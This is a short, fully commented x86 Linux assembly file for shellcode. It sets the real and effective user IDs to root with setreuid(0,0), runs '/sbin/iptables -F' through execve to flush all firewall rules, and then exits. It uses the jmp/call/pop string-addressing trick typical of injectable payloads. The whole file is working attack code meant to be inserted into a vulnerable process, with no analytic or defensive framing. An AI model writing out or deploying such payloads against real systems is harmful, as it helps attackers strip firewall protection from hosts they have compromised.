.section .text					# begin text section of code
	.globl _start				# declare _start label
_start:						# begin _start (main codeblock)
	# int setreuid(uid_t ruid, uid_t euid);
	xor	%eax, %eax			# xor eax register
	movb	$70, %al			# set syscall to 70 [setreuid()]
	xor	%ebx, %ebx			# xor ebx register
	xor	%ecx, %ecx			# xor ecx register
	int	$0x80				# execute above, setreuid(0,0)

	jmp	caller				# jmp to 'caller'
shellcode:
	# Processing the string from caller
	pop	%esi				# store address of command in ESI
	xor	%eax, %eax			# xor eax register
	movb	%al, 14(%esi)			# null-terminate first string at ‘#’
	movb	%al, 17(%esi)			# same with the second string

	# Preparing param's for syscall
	movl	%esi, 18(%esi)			# Store address of '/sbin/iptables' at 18(%esi) - [filename]
	leal	15(%esi), %ebx			# Store address of ARGV ('-F') to ebx
	movl	%ebx, 22(%esi)			# Store address at 22(%esi) - [argv]
	movl	%eax, 26(%esi) 			# NULL out 26(%esi) - [envp]

	# int execve(const char *filename, char *const argv[], char *const envp[]);
	movb	$11, %al			# set syscall to 11 [execve()]
	movl	%esi, %ebx			# ebx: argument 1
	leal	18(%esi), %ecx			# ecx: arguments pointer
	leal	26(%esi), %edx			# edx: evironment pointer
	int	$0x80				# execute above, execve('/sbin/iptables','-F',NULL)

	# void exit(int status);
	movb	$1, %al				# set syscall to 1 [exit()]
	xor	%ebx, %ebx			# xor ebx register
	int	$0x80				# execute above, exit(0)

caller:						# declare caller codeblock
	call	shellcode			# goto 'shellcode'
	.ascii	"/sbin/iptables#-F#AAAABBBBCCCC"
